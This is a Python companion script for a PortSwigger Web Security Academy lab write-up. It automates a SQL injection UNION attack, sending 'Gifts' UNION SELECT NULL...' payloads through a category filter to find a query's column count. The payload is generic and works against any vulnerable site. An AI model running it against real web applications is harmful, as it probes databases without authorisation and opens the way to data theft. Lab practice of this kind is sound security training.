#!/usr/bin/env python3
"""
SQL injection UNION attack, determining the number of columns returned by the query
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 07-union-determine-column-count.md

What this does:
    Sends UNION SELECT NULL[,NULL...] with an increasing number of NULL columns
    against the category filter. NULL type-checks against almost any column, so
    a request only stops erroring once the column count matches -- that's the
    lab's solve condition, no further payload needed.

Usage:
    python 07-union-determine-column-count.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import httpx

MAX_COLS = 10


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    column_count = 0
    for n in range(1, MAX_COLS + 1):
        nulls = ",".join(["NULL"] * n)
        payload = f"Gifts' UNION SELECT {nulls}-- "
        r = client.get(f"{lab_url}/filter", params={"category": payload})
        ok = r.status_code == 200 and "error" not in r.text.lower()[:200]
        print(f"[*] {n} column(s): {'OK' if ok else 'error'}")
        if ok:
            column_count = n
            break

    if not column_count:
        print("[-] Could not determine column count within the tried range.")
        return

    print(f"[+] UNION column count: {column_count}")
    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
